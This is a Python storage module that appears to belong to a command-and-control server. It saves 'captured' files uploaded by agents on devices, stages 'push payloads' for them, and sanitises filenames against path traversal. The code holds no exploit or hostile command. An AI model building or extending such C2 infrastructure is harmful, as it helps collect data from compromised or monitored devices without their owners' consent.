"""File storage: hashing, safe naming, category routing.

Everything written here lands outside ``static/`` so the Flask static handler
can never serve a capture directly. The only way to read a stored file is
through an authenticated route in ``app.py``.
"""

from __future__ import annotations

import hashlib
import json
import mimetypes
import os
import re
import shutil
import uuid
from datetime import datetime
from pathlib import Path

from config import Config
from database import db
from models import CapturedFile, Device
from c2.timeutil import utcnow

CHUNK = 64 * 1024

# Anything outside this set is collapsed away from the stored name.
_UNSAFE = re.compile(r"[^A-Za-z0-9._-]+")
MAX_STORED_NAME = 160


def sanitize_filename(filename: str | None, fallback: str = "file.bin") -> str:
    """Reduce an attacker-controlled filename to a flat, boring basename.

    ``os.path.basename`` alone is not enough: it is defeated by absolute paths
    on some platforms and by embedded separators, and the uuid prefix does
    not help because ``..`` is still resolved *after* the join.
    """
    if not filename:
        return fallback

    # Kill NULs and any directory component, POSIX or Windows.
    candidate = filename.replace("\x00", "")
    candidate = candidate.replace("\\", "/")
    candidate = candidate.split("/")[-1]

    # Drop leading dots so we never produce "" or ".." or hidden files.
    candidate = candidate.lstrip(".")

    candidate = _UNSAFE.sub("_", candidate).strip("._-")
    if not candidate:
        return fallback

    if len(candidate) > MAX_STORED_NAME:
        stem, dot, ext = candidate.rpartition(".")
        if dot and len(ext) <= 12:
            keep = MAX_STORED_NAME - len(ext) - 1
            candidate = stem[:keep] + "." + ext
        else:
            candidate = candidate[:MAX_STORED_NAME]

    return candidate


def safe_join(base: str | os.PathLike, *parts: str) -> Path:
    """Join under ``base`` and refuse anything that escapes it.

    Uses resolve()+is_relative_to so a sibling directory sharing a name prefix
    (``uploads/to_agent_evil`` next to ``uploads/to_agent``) is rejected —
    ``str.startswith`` does not catch that.
    """
    root = Path(base).resolve()
    target = root
    for part in parts:
        # Strip separators so no single argument can introduce a new segment.
        for seg in str(part).replace("\\", "/").split("/"):
            if seg in ("", "."):
                continue
            if seg == "..":
                # Explicit traversal attempt: refuse rather than normalise.
                raise ValueError("path traversal rejected")
            target = target / seg

    resolved = target.resolve()
    if resolved != root and root not in resolved.parents:
        raise ValueError("path escapes base directory")
    return resolved


def safe_write(stream, dest_dir: str, filename: str):
    """Write incoming file stream. Returns (path, size, sha256)."""
    os.makedirs(dest_dir, exist_ok=True)
    stored_name = f"{uuid.uuid4().hex}_{sanitize_filename(filename)}"
    path = os.path.join(dest_dir, stored_name)

    digest = hashlib.sha256()
    size = 0
    with open(path, "wb") as out:
        while True:
            chunk = stream.read(CHUNK)
            if not chunk:
                break
            digest.update(chunk)
            size += len(chunk)
            out.write(chunk)
    return path, size, digest.hexdigest()


def persist_upload(
    device: Device,
    file_stream,
    filename: str,
    category: str = "misc",
    command_id: int | None = None,
    mime_hint: str | None = None,
    metadata: dict | None = None,
) -> CapturedFile:
    # category is agent-supplied; it becomes a path segment, so constrain it.
    cat = sanitize_filename(category, fallback="misc").lower()
    dest = safe_join(Config.UPLOAD_FOLDER, cat, sanitize_filename(device.device_id, "unknown"))

    path, size, digest = safe_write(file_stream, str(dest), filename)

    mime = mime_hint or mimetypes.guess_type(filename)[0] or "application/octet-stream"

    cf = CapturedFile(
        device_id=device.id,
        command_id=command_id,
        category=cat,
        filename=sanitize_filename(filename, "file.bin"),
        stored_path=path,
        sha256=digest,
        size_bytes=size,
        mime_type=mime,
        captured_at=utcnow(),
        metadata_json=json.dumps(metadata or {}),
    )
    db.session.add(cf)
    db.session.commit()
    return cf


def delete_device_files(device: Device) -> int:
    """Remove every stored file belonging to a device. Returns bytes freed."""
    freed = 0
    roots = set()

    for cf in CapturedFile.query.filter_by(device_id=device.id).all():
        stored = cf.stored_path
        if stored:
            try:
                size = os.path.getsize(stored)
            except OSError:
                size = 0
            freed += size
            parent = os.path.dirname(stored)
            if parent:
                roots.add(parent)
        db.session.delete(cf)

    # Push payloads staged for this device.
    push_dir = Path(Config.UPLOAD_FOLDER) / "to_agent"
    staged = push_dir / sanitize_filename(device.device_id, "unknown")
    roots.add(str(staged))

    for root in roots:
        shutil.rmtree(root, ignore_errors=True)

    return freed


def verify_stored_path(stored_path: str) -> str | None:
    """Return stored_path if it really lives under UPLOAD_FOLDER, else None."""
    if not stored_path:
        return None
    try:
        resolved = safe_join(Config.UPLOAD_FOLDER)
        candidate = Path(stored_path).resolve()
    except (ValueError, OSError):
        return None
    if candidate == resolved or resolved not in candidate.parents:
        return None
    return str(candidate)